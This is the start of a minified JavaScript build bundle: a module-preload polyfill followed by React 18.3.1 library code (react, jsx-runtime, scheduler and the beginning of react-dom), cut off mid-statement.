function Zc(e,n){for(var t=0;t<n.length;t++){const r=n[t];if(typeof r!="string"&&!Array.isArray(r)){for(const i in r)if(i!=="default"&&!(i in e)){const l=Object.getOwnPropertyDescriptor(r,i);l&&Object.defineProperty(e,i,l.get?l:{enumerable:!0,get:()=>r[i]})}}}return Object.freeze(Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}))}(function(){const n=document.createElement("link").relList;if(n&&n.supports&&n.supports("modulepreload"))return;for(const i of document.querySelectorAll('link[rel="modulepreload"]'))r(i);new MutationObserver(i=>{for(const l of i)if(l.type==="childList")for(const o of l.addedNodes)o.tagName==="LINK"&&o.rel==="modulepreload"&&r(o)}).observe(document,{childList:!0,subtree:!0});function t(i){const l={};return i.integrity&&(l.integrity=i.integrity),i.referrerPolicy&&(l.referrerPolicy=i.referrerPolicy),i.crossOrigin==="use-credentials"?l.credentials="include":i.crossOrigin==="anonymous"?l.credentials="omit":l.credentials="same-origin",l}function r(i){if(i.ep)return;i.ep=!0;const l=t(i);fetch(i.href,l)}})();function ed(e){return e&&e.__esModule&&Object.prototype.hasOwnProperty.call(e,"default")?e.default:e}var ba={exports:{}},mi={},Ea={exports:{}},R={};/**
 * @license React
 * react.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var or=Symbol.for("react.element"),nd=Symbol.for("react.portal"),td=Symbol.for("react.fragment"),rd=Symbol.for("react.strict_mode"),id=Symbol.for("react.profiler"),ld=Symbol.for("react.provider"),od=Symbol.for("react.context"),sd=Symbol.for("react.forward_ref"),ad=Symbol.for("react.suspense"),ud=Symbol.for("react.memo"),cd=Symbol.for("react.lazy"),rs=Symbol.iterator;function dd(e){return e===null||typeof e!="object"?null:(e=rs&&e[rs]||e["@@iterator"],typeof e=="function"?e:null)}var Ca={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},Ta=Object.assign,_a={};function ht(e,n,t){this.props=e,this.context=n,this.refs=_a,this.updater=t||Ca}ht.prototype.isReactComponent={};ht.prototype.setState=function(e,n){if(typeof e!="object"&&typeof e!="function"&&e!=null)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,n,"setState")};ht.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")};function Pa(){}Pa.prototype=ht.prototype;function ro(e,n,t){this.props=e,this.context=n,this.refs=_a,this.updater=t||Ca}var io=ro.prototype=new Pa;io.constructor=ro;Ta(io,ht.prototype);io.isPureReactComponent=!0;var is=Array.isArray,Na=Object.prototype.hasOwnProperty,lo={current:null},La={key:!0,ref:!0,__self:!0,__source:!0};function ja(e,n,t){var r,i={},l=null,o=null;if(n!=null)for(r in n.ref!==void 0&&(o=n.ref),n.key!==void 0&&(l=""+n.key),n)Na.call(n,r)&&!La.hasOwnProperty(r)&&(i[r]=n[r]);var s=arguments.length-2;if(s===1)i.children=t;else if(1<s){for(var a=Array(s),d=0;d<s;d++)a[d]=arguments[d+2];i.children=a}if(e&&e.defaultProps)for(r in s=e.defaultProps,s)i[r]===void 0&&(i[r]=s[r]);return{$$typeof:or,type:e,key:l,ref:o,props:i,_owner:lo.current}}function fd(e,n){return{$$typeof:or,type:e.type,key:n,ref:e.ref,props:e.props,_owner:e._owner}}function oo(e){return typeof e=="object"&&e!==null&&e.$$typeof===or}function pd(e){var n={"=":"=0",":":"=2"};return"$"+e.replace(/[=:]/g,function(t){return n[t]})}var ls=/\/+/g;function Mi(e,n){return typeof e=="object"&&e!==null&&e.key!=null?pd(""+e.key):n.toString(36)}function Or(e,n,t,r,i){var l=typeof e;(l==="undefined"||l==="boolean")&&(e=null);var o=!1;if(e===null)o=!0;else switch(l){case"string":case"number":o=!0;break;case"object":switch(e.$$typeof){case or:case nd:o=!0}}if(o)return o=e,i=i(o),e=r===""?"."+Mi(o,0):r,is(i)?(t="",e!=null&&(t=e.replace(ls,"$&/")+"/"),Or(i,n,t,"",function(d){return d})):i!=null&&(oo(i)&&(i=fd(i,t+(!i.key||o&&o.key===i.key?"":(""+i.key).replace(ls,"$&/")+"/")+e)),n.push(i)),1;if(o=0,r=r===""?".":r+":",is(e))for(var s=0;s<e.length;s++){l=e[s];var a=r+Mi(l,s);o+=Or(l,n,t,a,i)}else if(a=dd(e),typeof a=="function")for(e=a.call(e),s=0;!(l=e.next()).done;)l=l.value,a=r+Mi(l,s++),o+=Or(l,n,t,a,i);else if(l==="object")throw n=String(e),Error("Objects are not valid as a React child (found: "+(n==="[object Object]"?"object with keys {"+Object.keys(e).join(", ")+"}":n)+"). If you meant to render a collection of children, use an array instead.");return o}function mr(e,n,t){if(e==null)return e;var r=[],i=0;return Or(e,r,"","",function(l){return n.call(t,l,i++)}),r}function hd(e){if(e._status===-1){var n=e._result;n=n(),n.then(function(t){(e._status===0||e._status===-1)&&(e._status=1,e._result=t)},function(t){(e._status===0||e._status===-1)&&(e._status=2,e._result=t)}),e._status===-1&&(e._status=0,e._result=n)}if(e._status===1)return e._result.default;throw e._result}var ue={current:null},Rr={transition:null},md={ReactCurrentDispatcher:ue,ReactCurrentBatchConfig:Rr,ReactCurrentOwner:lo};function Oa(){throw Error("act(...) is not supported in production builds of React.")}R.Children={map:mr,forEach:function(e,n,t){mr(e,function(){n.apply(this,arguments)},t)},count:function(e){var n=0;return mr(e,function(){n++}),n},toArray:function(e){return mr(e,function(n){return n})||[]},only:function(e){if(!oo(e))throw Error("React.Children.only expected to receive a single React element child.");return e}};R.Component=ht;R.Fragment=td;R.Profiler=id;R.PureComponent=ro;R.StrictMode=rd;R.Suspense=ad;R.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=md;R.act=Oa;R.cloneElement=function(e,n,t){if(e==null)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var r=Ta({},e.props),i=e.key,l=e.ref,o=e._owner;if(n!=null){if(n.ref!==void 0&&(l=n.ref,o=lo.current),n.key!==void 0&&(i=""+n.key),e.type&&e.type.defaultProps)var s=e.type.defaultProps;for(a in n)Na.call(n,a)&&!La.hasOwnProperty(a)&&(r[a]=n[a]===void 0&&s!==void 0?s[a]:n[a])}var a=arguments.length-2;if(a===1)r.children=t;else if(1<a){s=Array(a);for(var d=0;d<a;d++)s[d]=arguments[d+2];r.children=s}return{$$typeof:or,type:e.type,key:i,ref:l,props:r,_owner:o}};R.createContext=function(e){return e={$$typeof:od,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null},e.Provider={$$typeof:ld,_context:e},e.Consumer=e};R.createElement=ja;R.createFactory=function(e){var n=ja.bind(null,e);return n.type=e,n};R.createRef=function(){return{current:null}};R.forwardRef=function(e){return{$$typeof:sd,render:e}};R.isValidElement=oo;R.lazy=function(e){return{$$typeof:cd,_payload:{_status:-1,_result:e},_init:hd}};R.memo=function(e,n){return{$$typeof:ud,type:e,compare:n===void 0?null:n}};R.startTransition=function(e){var n=Rr.transition;Rr.transition={};try{e()}finally{Rr.transition=n}};R.unstable_act=Oa;R.useCallback=function(e,n){return ue.current.useCallback(e,n)};R.useContext=function(e){return ue.current.useContext(e)};R.useDebugValue=function(){};R.useDeferredValue=function(e){return ue.current.useDeferredValue(e)};R.useEffect=function(e,n){return ue.current.useEffect(e,n)};R.useId=function(){return ue.current.useId()};R.useImperativeHandle=function(e,n,t){return ue.current.useImperativeHandle(e,n,t)};R.useInsertionEffect=function(e,n){return ue.current.useInsertionEffect(e,n)};R.useLayoutEffect=function(e,n){return ue.current.useLayoutEffect(e,n)};R.useMemo=function(e,n){return ue.current.useMemo(e,n)};R.useReducer=function(e,n,t){return ue.current.useReducer(e,n,t)};R.useRef=function(e){return ue.current.useRef(e)};R.useState=function(e){return ue.current.useState(e)};R.useSyncExternalStore=function(e,n,t){return ue.current.useSyncExternalStore(e,n,t)};R.useTransition=function(){return ue.current.useTransition()};R.version="18.3.1";Ea.exports=R;var b=Ea.exports;const Ra=ed(b),gd=Zc({__proto__:null,default:Ra},[b]);/**
 * @license React
 * react-jsx-runtime.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var vd=b,yd=Symbol.for("react.element"),wd=Symbol.for("react.fragment"),kd=Object.prototype.hasOwnProperty,xd=vd.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,Sd={key:!0,ref:!0,__self:!0,__source:!0};function Aa(e,n,t){var r,i={},l=null,o=null;t!==void 0&&(l=""+t),n.key!==void 0&&(l=""+n.key),n.ref!==void 0&&(o=n.ref);for(r in n)kd.call(n,r)&&!Sd.hasOwnProperty(r)&&(i[r]=n[r]);if(e&&e.defaultProps)for(r in n=e.defaultProps,n)i[r]===void 0&&(i[r]=n[r]);return{$$typeof:yd,type:e,key:l,ref:o,props:i,_owner:xd.current}}mi.Fragment=wd;mi.jsx=Aa;mi.jsxs=Aa;ba.exports=mi;var u=ba.exports,Ma={exports:{}},xe={},Ia={exports:{}},Da={};/**
 * @license React
 * scheduler.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */(function(e){function n(P,L){var O=P.length;P.push(L);e:for(;0<O;){var $=O-1>>>1,q=P[$];if(0<i(q,L))P[$]=L,P[O]=q,O=$;else break e}}function t(P){return P.length===0?null:P[0]}function r(P){if(P.length===0)return null;var L=P[0],O=P.pop();if(O!==L){P[0]=O;e:for(var $=0,q=P.length,pr=q>>>1;$<pr;){var En=2*($+1)-1,Ai=P[En],Cn=En+1,hr=P[Cn];if(0>i(Ai,O))Cn<q&&0>i(hr,Ai)?(P[$]=hr,P[Cn]=O,$=Cn):(P[$]=Ai,P[En]=O,$=En);else if(Cn<q&&0>i(hr,O))P[$]=hr,P[Cn]=O,$=Cn;else break e}}return L}function i(P,L){var O=P.sortIndex-L.sortIndex;return O!==0?O:P.id-L.id}if(typeof performance=="object"&&typeof performance.now=="function"){var l=performance;e.unstable_now=function(){return l.now()}}else{var o=Date,s=o.now();e.unstable_now=function(){return o.now()-s}}var a=[],d=[],m=1,h=null,g=3,k=!1,w=!1,x=!1,C=typeof setTimeout=="function"?setTimeout:null,p=typeof clearTimeout=="function"?clearTimeout:null,c=typeof setImmediate<"u"?setImmediate:null;typeof navigator<"u"&&navigator.scheduling!==void 0&&navigator.scheduling.isInputPending!==void 0&&navigator.scheduling.isInputPending.bind(navigator.scheduling);function f(P){for(var L=t(d);L!==null;){if(L.callback===null)r(d);else if(L.startTime<=P)r(d),L.sortIndex=L.expirationTime,n(a,L);else break;L=t(d)}}function v(P){if(x=!1,f(P),!w)if(t(a)!==null)w=!0,Oi(y);else{var L=t(d);L!==null&&Ri(v,L.startTime-P)}}function y(P,L){w=!1,x&&(x=!1,p(N),N=-1),k=!0;var O=g;try{for(f(L),h=t(a);h!==null&&(!(h.expirationTime>L)||P&&!ge());){var $=h.callback;if(typeof $=="function"){h.callback=null,g=h.priorityLevel;var q=$(h.expirationTime<=L);L=e.unstable_now(),typeof q=="function"?h.callback=q:h===t(a)&&r(a),f(L)}else r(a);h=t(a)}if(h!==null)var pr=!0;else{var En=t(d);En!==null&&Ri(v,En.startTime-L),pr=!1}return pr}finally{h=null,g=O,k=!1}}var T=!1,E=null,N=-1,U=5,j=-1;function ge(){return!(e.unstable_now()-j<U)}function bn(){if(E!==null){var P=e.unstable_now();j=P;var L=!0;try{L=E(!0,P)}finally{L?yt():(T=!1,E=null)}}else T=!1}var yt;if(typeof c=="function")yt=function(){c(bn)};else if(typeof MessageChannel<"u"){var ts=new MessageChannel,Jc=ts.port2;ts.port1.onmessage=bn,yt=function(){Jc.postMessage(null)}}else yt=function(){C(bn,0)};function Oi(P){E=P,T||(T=!0,yt())}function Ri(P,L){N=C(function(){P(e.unstable_now())},L)}e.unstable_IdlePriority=5,e.unstable_ImmediatePriority=1,e.unstable_LowPriority=4,e.unstable_NormalPriority=3,e.unstable_Profiling=null,e.unstable_UserBlockingPriority=2,e.unstable_cancelCallback=function(P){P.callback=null},e.unstable_continueExecution=function(){w||k||(w=!0,Oi(y))},e.unstable_forceFrameRate=function(P){0>P||125<P?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):U=0<P?Math.floor(1e3/P):5},e.unstable_getCurrentPriorityLevel=function(){return g},e.unstable_getFirstCallbackNode=function(){return t(a)},e.unstable_next=function(P){switch(g){case 1:case 2:case 3:var L=3;break;default:L=g}var O=g;g=L;try{return P()}finally{g=O}},e.unstable_pauseExecution=function(){},e.unstable_requestPaint=function(){},e.unstable_runWithPriority=function(P,L){switch(P){case 1:case 2:case 3:case 4:case 5:break;default:P=3}var O=g;g=P;try{return L()}finally{g=O}},e.unstable_scheduleCallback=function(P,L,O){var $=e.unstable_now();switch(typeof O=="object"&&O!==null?(O=O.delay,O=typeof O=="number"&&0<O?$+O:$):O=$,P){case 1:var q=-1;break;case 2:q=250;break;case 5:q=1073741823;break;case 4:q=1e4;break;default:q=5e3}return q=O+q,P={id:m++,callback:L,priorityLevel:P,startTime:O,expirationTime:q,sortIndex:-1},O>$?(P.sortIndex=O,n(d,P),t(a)===null&&P===t(d)&&(x?(p(N),N=-1):x=!0,Ri(v,O-$))):(P.sortIndex=q,n(a,P),w||k||(w=!0,Oi(y))),P},e.unstable_shouldYield=ge,e.unstable_wrapCallback=function(P){var L=g;return function(){var O=g;g=L;try{return P.apply(this,arguments)}finally{g=O}}}})(Da);Ia.exports=Da;var bd=Ia.exports;/**
 * @license React
 * react-dom.production.min.js
 *
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */var Ed=b,ke=bd;function S(e){for(var n="https://reactjs.org/docs/error-decoder.html?invariant="+e,t=1;t<arguments.length;t++)n+="&args[]="+encodeURIComponent(arguments[t]);return"Minified React error #"+e+"; visit "+n+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var za=new Set,Ut={};function Bn(e,n){st(e,n),st(e+"Capture",n)}function st(e,n){for(Ut[e]=n,e=0;e<n.length;e++)za.add(n[e])}var Ke=!(typeof window>"u"||typeof window.document>"u"||typeof window.document.createElement>"u"),al=Object.prototype.hasOwnProperty,Cd=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,os={},ss={};function Td(e){return al.call(ss,e)?!0:al.call(os,e)?!1:Cd.test(e)?ss[e]=!0:(os[e]=!0,!1)}function _d(e,n,t,r){if(t!==null&&t.type===0)return!1;switch(typeof n){case"function":case"symbol":return!0;case"boolean":return r?!1:t!==null?!t.acceptsBooleans:(e=e.toLowerCase().slice(0,5),e!=="data-"&&e!=="aria-");default:return!1}}function Pd(e,n,t,r){if(n===null||typeof n>"u"||_d(e,n,t,r))return!0;if(r)return!1;if(t!==null)switch(t.type){case 3:return!n;case 4:return n===!1;case 5:return isNaN(n);case 6:return isNaN(n)||1>n}return!1}function ce(e,n,t,r,i,l,o){this.acceptsBooleans=n===2||n===3||n===4,this.attributeName=r,this.attributeNamespace=i,this.mustUseProperty=t,this.propertyName=e,this.type=n,this.sanitizeURL=l,this.removeEmptyString=o}var te={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function(e){te[e]=new ce(e,0,!1,e,null,!1,!1)});[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach(function(e){var n=e[0];te[n]=new ce(n,1,!1,e[1],null,!1,!1)});["contentEditable","draggable","spellCheck","value"].forEach(function(e){te[e]=new ce(e,2,!1,e.toLowerCase(),null,!1,!1)});["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach(function(e){te[e]=new ce(e,2,!1,e,null,!1,!1)});"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function(e){te[e]=new ce(e,3,!1,e.toLowerCase(),null,!1,!1)});["checked","multiple","muted","selected"].forEach(function(e){te[e]=new ce(e,3,!0,e,null,!1,!1)});["capture","download"].forEach(function(e){te[e]=new ce(e,4,!1,e,null,!1,!1)});["cols","rows","size","span"].forEach(function(e){te[e]=new ce(e,6,!1,e,null,!1,!1)});["rowSpan","start"].forEach(function(e){te[e]=new ce(e,5,!1,e.toLowerCase(),null,!1,!1)});var so=/[\-:]([a-z])/g;function ao(e){return e[1].toUpperCase()}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function(e){var n=e.replace(so,ao);te[n]=new ce(n,1,!1,e,null,!1,!1)});"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var n=e.replace(so,ao);te[n]=new ce(n,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)});["xml:base","xml:lang","xml:space"].forEach(function(e){var n=e.replace(so,ao);te[n]=new ce(n,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)});["tabIndex","crossOrigin"].forEach(function(e){te[e]=new ce(e,1,!1,e.toLowerCase(),null,!1,!1)});te.xlinkHref=new ce("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1);["src","href","action","formAction"].forEach(function(e){te[e]=new ce(e,1,!1,e.toLowerCase(),null,!0,!0)});function uo(e,n,t,r){var i=te.hasOwnProperty(n)?te[n]:null;(i!==null?i.type!==0:r||!(2<n.length)||n[0]!=="o"&&n[0]!=="O"||n[1]!=="n"&&n[1]!=="N")&&(Pd(n,t,i,r)&&(t=null),r||i===null?Td(n)&&(t===null?e.removeAttribute(n):e.setAttribute(n,""+t)):i.mustUseProperty?e[i.propertyName]=t===null?i.type===3?!1:"":t:(n=i.attributeName,r=i.attributeNamespace,t===null?e.removeAttribute(n):(i=i.type,t=i===3||i===4&&t===!0?"":""+t,r?e.setAttributeNS(r,n,t):e.setAttribute(n,t))))}var Je=Ed.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,gr=Symbol.for("react.element"),Vn=Symbol.for("react.portal"),Wn=Symbol.for("react.fragment"),co=Symbol.for("react.strict_mode"),ul=Symbol.for("react.profiler"),Ba=Symbol.for("react.provider"),Ua=Symbol.for("react.context"),fo=Symbol.for("react.forward_ref"),cl=Symbol.for("react.suspense"),dl=Symbol.for("react.suspense_list"),po=Symbol.for("react.memo"),en=Symbol.for("react.lazy"),Fa=Symbol.for("react.offscreen"),as=Symbol.iterator;function wt(e){return e===null||typeof e!="object"?null:(e=as&&e[as]||e["@@iterator"],typeof e=="function"?e:null)}var V=Object.assign,Ii;function _t(e){if(Ii===void 0)try{throw Error()}catch(t){var n=t.stack.trim().match(/\n( *(at )?)/);Ii=n&&n[1]||""}return`
`+Ii+e}var Di=!1;function zi(e,n){if(!e||Di)return"";Di=!0;var t=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(n)if(n=function(){throw Error()},Object.defineProperty(n.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(n,[])}catch(d){var r=d}Reflect.construct(e,[],n)}else{try{n.call()}catch(d){r=d}e.call(n.prototype)}else{try{throw Error()}catch(d){r=d}e()}}catch(d){if(d&&r&&typeof d.stack=="string"){for(var i=d.stack.split(`
`),l=r.stack.split(`
`),o=i.length-1,s=l.length-1;1<=o&&0<=s&&i[o]!==l[s];)s--;for(;1<=o&&0<=s;o--,s--)if(i[o]!==l[s]){if(o!==1||s!==1)do if(o--,s--,0>s||i[o]!==l[s]){var a=`
`+i[o].replace(" at new "," at ");return e.displayName&&a.includes("<anonymous>")&&(a=a.replace("<anonymous>",e.displayName)),a}while(1<=o&&0<=s);break}}}finally{Di=!1,Error.prepareStackTrace=t}return(e=e?e.displayName||e.name:"")?_t(e):""}function Nd(e){switch(e.tag){case 5:return _t(e.type);case 16:return _t("Lazy");case 13:return _t("Suspense");case 19:return _t("SuspenseList");case 0:case 2:case 15:return e=zi(e.type,!1),e;case 11:return e=zi(e.type.render,!1),e;case 1:return e=zi(e.type,!0),e;default:return""}}function fl(e){if(e==null)return null;if(typeof e=="function")return e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case Wn:return"Fragment";case Vn:return"Portal";case ul:return"Profiler";case co:return"StrictMode";case cl:return"Suspense";case dl:return"SuspenseList"}if(typeof e=="object")switch(e.$$typeof){case Ua:return(e.displayName||"Context")+".Consumer";case Ba:return(e._context.displayName||"Context")+".Provider";case fo:var n=e.render;return e=e.displayName,e||(e=n.displayName||n.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case po:return n=e.displayName||null,n!==null?n:fl(e.type)||"Memo";case en:n=e._payload,e=e._init;try{return fl(e(n))}catch{}}return null}function Ld(e){var n=e.type;switch(e.tag){case 24:return"Cache";case 9:return(n.displayName||"Context")+".Consumer";case 10:return(n._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=n.render,e=e.displayName||e.name||"",n.displayName||(e!==""?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return n;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return fl(n);case 8:return n===co?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if(typeof n=="function")return n.displayName||n.name||null;if(typeof n=="string")return n}return null}function vn(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":return e;case"object":return e;default:return""}}function Ha(e){var n=e.type;return(e=e.nodeName)&&e.toLowerCase()==="input"&&(n==="checkbox"||n==="radio")}function jd(e){var n=Ha(e)?"checked":"value",t=Object.getOwnPropertyDescriptor(e.constructor.prototype,n),r=""+e[n];if(!e.hasOwnProperty(n)&&typeof t<"u"&&typeof t.get=="function"&&typeof t.set=="function"){var i=t.get,l=t.set;return Object.defineProperty(e,n,{configurable:!0,get:function(){return i.call(this)},set:function(o){r=""+o,l.call(this,o)}}),Object.defineProperty(e,n,{enumerable:t.enumerable}),{getValue:function(){return r},setValue:function(o){r=""+o},stopTracking:function(){e._valueTracker=null,delete e[n]}}}}function vr(e){e._valueTracker||(e._valueTracker=jd(e))}function Va(e){if(!e)return!1;var n=e._valueTracker;if(!n)return!0;var t=n.getValue(),r="";return e&&(r=Ha(e)?e.checked?"true":"false":e.value),e=r,e!==t?(n.setValue(e),!0):!1}function Wr(e){if(e=e||(typeof document<"u"?document:void 0),typeof e>"u")return null;try{return e.activeElement||e.body}catch{return e.body}}function pl(e,n){var t=n.checked;return V({},n,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:t??e._wrapperState.initialChecked})}function us(e,n){var t=n.defaultValue==null?"":n.defaultValue,r=n.checked!=null?n.checked:n.defaultChecked;t=vn(n.value!=null?n.value:t),e._wrapperState={initialChecked:r,initialValue:t,controlled:n.type==="checkbox"||n.type==="radio"?n.checked!=null:n.value!=null}}function Wa(e,n){n=n.checked,n!=null&&uo(e,"checked",n,!1)}function hl(e,n){Wa(e,n);var t=vn(n.value),r=n.type;if(t!=null)r==="number"?(t===0&&e.value===""||e.value!=t)&&(e.value=""+t):e.value!==""+t&&(e.value=""+t);else if(r==="submit"||r==="reset"){e.removeAttribute("value");return}n.hasOwnProperty("value")?ml(e,n.type,t):n.hasOwnProperty("defaultValue")&&ml(e,n.type,vn(n.defaultValue)),n.checked==null&&n.defaultChecked!=null&&(e.defaultChecked=!!n.defaultChecked)}function cs(e,n,t){if(n.hasOwnProperty("value")||n.hasOwnProperty("defaultValue")){var r=n.type;if(!(r!=="submit"&&r!=="reset"||n.value!==void 0&&n.value!==null))return;n=""+e._wrapperState.initialValue,t||n===e.value||(e.value=n),e.defaultValue=n}t=e.name,t!==""&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,t!==""&&(e.name=t)}function ml(e,n,t){(n!=="number"||Wr(e.ownerDocument)!==e)&&(t==null?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+t&&(e.defaultValue=""+t))}var Pt=Array.isArray;function nt(e,n,t,r){if(e=e.options,n){n={};for(var i=0;i<t.length;i++)n["$"+t[i]]=!0;for(t=0;t<e.length;t++)i=n.hasOwnProperty("$"+e[t].value),e[t].selected!==i&&(e[t].selected=i),i&&r&&(e[t].defaultSelected=!0)}else{for(t=""+vn(t),n=null,i=0;i<e.length;i++){if(e[i].value===t){e[i].selected=!0,r&&(e[i].defaultSelected=!0);return}n!==null||e[i].disabled||(n=e[i])}n!==null&&(n.selected=!0)}}function gl(e,n){if(n.dangerouslySetInnerHTML!=null)throw Error(S(91));return V({},n,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function ds(e,n){var t=n.value;if(t==null){if(t=n.children,n=n.defaultValue,t!=null){if(n!=null)throw Error(S(92));if(Pt(t)){if(1<t.length)throw Error(S(93));t=t[0]}n=t}n==null&&(n=""),t=n}e._wrapperState={initialValue:vn(t)}}function $a(e,n){var t=vn(n.value),r=vn(n.defaultValue);t!=null&&(t=""+t,t!==e.value&&(e.value=t),n.defaultValue==null&&e.defaultValue!==t&&(e.defaultValue=t)),r!=null&&(e.defaultValue=""+r)}function fs(e){var n=e.textContent;n===e._wrapperState.initialValue&&n!==""&&n!==null&&(e.value=n)}function Ga(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function vl(e,n){return e==null||e==="http://www.w3.org/1999/xhtml"?Ga(n):e==="http://www.w3.org/2000/svg"&&n==="foreignObject"?"http://www.w3.org/1999/xhtml":e}var yr,Qa=function(e){return typeof MSApp<"u"&&MSApp.execUnsafeLocalFunction?function(n,t,r,i){MSApp.execUnsafeLocalFunction(function(){return e(n,t,r,i)})}:e}(function(e,n){if(e.namespaceURI!=="http://www.w3.org/2000/svg"||"innerHTML"in e)e.innerHTML=n;else{for(yr=yr||document.createElement("div"),yr.innerHTML="<svg>"+n.valueOf().toString()+"</svg>",n=yr.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;n.firstChild;)e.appendChild(n.firstChild)}});function Ft(e,n){if(n){var t=e.firstChild;if(t&&t===e.lastChild&&t.nodeType===3){t.nodeValue=n;return}}e.textContent=n}var jt={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},Od=["Webkit","ms","Moz","O"];Object.keys(jt).forEach(function(e){Od.forEach(function(n){n=n+e.charAt(0).toUpperCase()+e.substring(1),jt[n]=jt[e]})});function Ka(e,n,t){return n==null||typeof n=="boolean"||n===""?"":t||typeof n!="number"||n===0||jt.hasOwnProperty(e)&&jt[e]?(""+n).trim():n+"px"}function Ya(e,n){e=e.style;for(var t in n)if(n.hasOwnProperty(t)){var r=t.indexOf("--")===0,i=Ka(t,n[t],r);t==="float"&&(t="cssFloat"),r?e.setProperty(t,i):e[t]=i}}var Rd=V({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function yl(e,n){if(n){if(Rd[e]&&(n.children!=null||n.dangerouslySetInnerHTML!=null))throw Error(S(137,e));if(n.dangerouslySetInnerHTML!=null){if(n.children!=null)throw Error(S(60));if(typeof 